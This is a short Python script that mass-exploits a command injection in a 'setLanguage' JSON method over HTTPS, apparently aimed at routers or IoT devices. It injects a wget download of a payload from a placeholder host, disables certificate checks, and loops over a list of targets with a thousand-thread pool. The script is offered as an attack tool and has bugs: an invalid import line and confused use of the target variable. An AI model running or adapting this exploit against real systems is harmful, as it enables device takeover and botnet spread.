import requests, urllib3, sys, threading, os vthread
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


payload = 'wget 0.0.0.0/xxx'



victim = sys.argv[1]


@vthread.pool(1000)
def main(url):
    print("[RESOLVER +] Serving payload to %s\n" % victim)
    url = "https://" + victim + ":443/"
    json = {"method": "setLanguage", "params": {"payload": "';" + payload + ";'"}}
    requests.post(url, json=json, verify=False)

ip = open(victim).readlines()

for i in ip:
    i = i.strip()
    main(i)
    